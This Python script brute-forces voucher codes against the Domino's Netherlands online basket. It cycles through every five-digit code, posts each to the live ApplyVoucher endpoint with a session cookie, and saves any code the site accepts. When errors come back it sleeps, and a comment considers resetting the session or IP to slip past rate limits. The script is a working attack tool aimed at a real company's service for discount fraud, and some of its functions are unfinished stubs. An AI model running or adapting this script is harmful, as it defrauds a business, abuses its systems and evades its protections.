import time
import random
import requests

sessionid = ''
basket = "https://bestellen.dominos.nl/eStore/nl/Basket/"
cookies = {'ASP.NET_SessionId': sessionid, 'Language': 'nl'}
checkurl = "https://bestellen.dominos.nl/eStore/nl/Basket/GetBasketView?#"

class PizzaBoy:

    def __init__(self, runid):
        self.runid = runid
        self.name = random.choice(['Donatello', 'Leonardo', 'Michelangelo', 'Rafael'])
        self.greet()

    def greet(self):
        print("Hello, my name is {0}. I am your Pizza Boy".format(self.name))

    def run(self):
        print("Checking codes")
        for code in range(0, 99999):
            code = self.adapt_code(code) if code < 10000 else str(code)
            self.try_code(code)

    def adapt_code(self, code):
        codestring = str(code)
        prefix = '0' * (5 - len(codestring))
        return prefix + codestring

    def try_code(self, code):
        url = basket + "ApplyVoucher?voucherCode=" + str(code)
        result = self.send_code(url)
        if (result):
            discount = self.get_discount_from_code(code)
            self.remove_code_from_basket();
            self.remember_code_and_discount(code, discount)
            self.say_code_and_discount(code, discount)

    def send_code(self, url):
        cookies = {'ASP.NET_SessionId': sessionid, 'Language': 'nl'}
        r = requests.post(url, cookies=cookies)
        response = r.text

        if (r.status_code!=200):
            self.go_to_sleep(3600)
            return False

        return '{"Url":null,"Messages":null}' in response

    def get_discount_from_code(self, code):
        return 'discount'

    def remove_code_from_basket(self):
        pass

    def go_to_sleep(self, seconds):
        #todo: maybe reset the session id, or even ip
        time.sleep(seconds)

    def remember_code_and_discount(self, code, discount):
        with open('codes{0}.txt'.format(self.runid), 'w') as file:
            file.write('code: {0}\tdiscount: {1}\n'.format(code, discount))

    def say_code_and_discount(self, code, discount):
        print('code: {0}\tdiscount: {1}'.format(code, discount))

def main():
    runid = 0 #todo: increment run id
    pb = PizzaBoy(runid)
    pb.run()

if __name__ == '__main__':
    main()